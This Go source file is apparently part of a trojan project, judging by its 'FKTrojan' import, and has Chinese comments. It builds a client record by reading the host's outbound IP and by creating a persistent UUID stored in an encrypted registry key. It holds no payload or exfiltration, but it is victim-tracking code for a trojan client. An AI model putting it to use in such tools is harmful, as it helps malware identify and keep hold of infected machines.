package dao

import (
	"FKTrojan/registry_crypto"
	"crypto/rand"

	"fmt"
	"io"

	"net"
)

/*
注意这里的字段都是首字母大写
因为需要在gob中decode的时候，只有大写的字段才能够访问到，
与json串行化时首字母大写道理相同
*/
type Client struct {
	//de1fcd20-6661-4304-b525-be283ab39ccd
	GUID string
	IP   string
}

func NewClient() *Client {
	uid, _ := GetUID()
	return &Client{
		GUID: uid,
		IP:   getOutboundIP(),
	}
}
func getOutboundIP() string {
	conn, err := net.Dial("udp", "8.8.8.8:53")
	if err != nil {
		return "---"
	}
	defer conn.Close()

	localAddr := conn.LocalAddr().(*net.UDPAddr)

	return fmt.Sprintf("%v", localAddr.IP)
}

//------------------------------------------------------------
// 获取自身的UUID，若找不到，则新创建一份
func GetUID() (string, error) {
	val, err := registry_crypto.Get(registry_crypto.UIDKEY)
	if err != nil { //Make new UUID
		uuid, _ := newUUID()
		// 回写uuid，保证下次程序重启后获取到此id
		err = writeUID(uuid)
		if err != nil {
			return "", err
		}
		return uuid, nil
	}
	return val, nil

}
func writeUID(uid string) error {
	return registry_crypto.Set(registry_crypto.UIDKEY, uid)
}

//------------------------------------------------------------
// 生成一个UUID
func newUUID() (string, error) {
	uuid := make([]byte, 16)
	n, err := io.ReadFull(rand.Reader, uuid)
	if n != len(uuid) || err != nil {
		return "", err
	}
	uuid[8] = uuid[8]&^0xc0 | 0x80
	uuid[6] = uuid[6]&^0xf0 | 0x40
	return fmt.Sprintf("%x-%x-%x-%x-%x", uuid[0:4], uuid[4:6], uuid[6:8], uuid[8:10], uuid[10:]), nil
}
